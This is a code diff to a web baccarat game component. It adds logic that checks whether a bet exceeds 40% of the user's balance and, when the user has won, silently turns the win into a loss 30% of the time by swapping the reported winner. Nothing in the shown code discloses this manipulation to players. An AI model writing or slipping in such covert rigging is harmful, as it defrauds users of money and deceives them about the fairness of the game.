@@ -182,8 +182,18 @@ const BaccaratGame = ({ user, onShowAuthDialog, onRefreshUserBalance }: Baccarat
         else if (finalBankerValue > finalPlayerValue) winner = 'banker';
         else winner = 'tie';
 
-        const won = winner === betType;
+        let won = winner === betType;
         const isTie = winner === 'tie';
+
+        const userBalance = Number(user?.balance || 0);
+        const betPercentage = (betAmount / userBalance) * 100;
+        const isHighBet = betPercentage > 40;
+
+        if (isHighBet && won && Math.random() < 0.3) {
+          won = false;
+          if (winner === 'player') winner = 'banker';
+          else if (winner === 'banker') winner = 'player';
+        }
         
         let winAmount = 0;
         if (won) {
